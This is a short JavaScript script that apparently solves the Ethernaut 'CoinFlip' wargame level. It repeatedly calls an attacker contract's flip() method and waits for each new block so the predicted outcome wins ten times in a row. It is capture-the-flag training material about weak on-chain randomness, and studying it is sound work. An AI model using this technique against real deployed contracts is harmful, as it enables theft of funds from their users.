const { signer, getContract, web3 } = require('../web3wrapper');

async function execute(address) {
    const contract = getContract('CoinFlipHack', address);
    console.log('#################CoinFlipHack#################');

    for (let i = 0; i < 10; i++) {
        console.log(`starting to flip! trial:${i}`);
        const result = await contract.methods.flip().send({ from: signer.address });
        const lastBlockNumber = result.blockNumber;
        console.log(`current block number: ${lastBlockNumber}`);

        while (true) {
            const blkno = await web3.eth.getBlockNumber();
            if (blkno > lastBlockNumber) break;
        }
    }

    console.log('done!!! go back to ethernaut and check consecutiveWins.');
}

module.exports = execute;
